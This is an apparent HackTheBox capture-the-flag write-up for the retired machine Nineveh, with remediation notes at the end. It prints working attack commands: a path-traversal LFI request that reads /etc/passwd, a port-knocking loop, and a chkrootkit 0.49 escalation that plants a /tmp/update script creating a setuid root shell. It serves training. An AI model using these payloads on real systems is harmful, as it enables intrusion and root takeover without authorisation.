HTB Nineveh: port knocking, notes LFI, and chkrootkit to root

retired-machineeasy

Nineveh is a retired HackTheBox easy Linux machine famous for one mechanic: port knocking. Synopsis: a filtered SSH port opens to a knock sequence, a notes-app LFI discloses credentials, and chkrootkit 0.49 runs attacker-controlled /tmp/update as root.

$ Enumeration — filtered is not closed

# bash: full sweep plus knock
nmap -sC -sV -p- -oN nineveh.nmap 10.10.10.43   # SSH shows filtered
# knock sequence from the box hints (ports 7000,8000,9000 family):
for p in 7000 8000 9000; do nmap -Pn --host-timeout 3 --max-retries 0 -p $p 10.10.10.43; done
ssh amrois@10.10.10.43   # port now open

Filtered differs from closed — knock first. The web app (secure_notes) plus on-box hints reveal the sequence; after knocking, SSH swings open.

$ Foothold pieces — LFI to creds

# bash: notes LFI to login
# secure_notes local file inclusion discloses local files incl. key material:
curl "http://10.10.10.43/secure_notes/notes.php?note=../../../../etc/passwd"
# -> amrois credential material; SSH in normally

Use LFI for credential disclosure, then log in like a gentleman. Two small findings compose into one foothold — easy boxes love composition.

$ Privilege escalation — chkrootkit 0.49

# bash: plant /tmp/update, wait
chkrootkit -V   # 0.49, runs /tmp/update as root on schedule
echo -e '#!/bin/sh\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/update
chmod +x /tmp/update
# wait for the scheduled run, then:
/tmp/rootbash -p
id   # uid=0(root)

Ancient chkrootkit executes /tmp/update as root. Drop a malicious script, wait for the scheduled run, catch root. The scanner becomes the vulnerability. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Declaring SSH unreachable (knock first) and exploiting LFI for RCE directly (disclose creds, then log in).

$ Remediation notes

Retire port-knocking-as-security, patch or remove chkrootkit-era tooling, and never execute world-writable files as root. Written by Lucky Thandel.
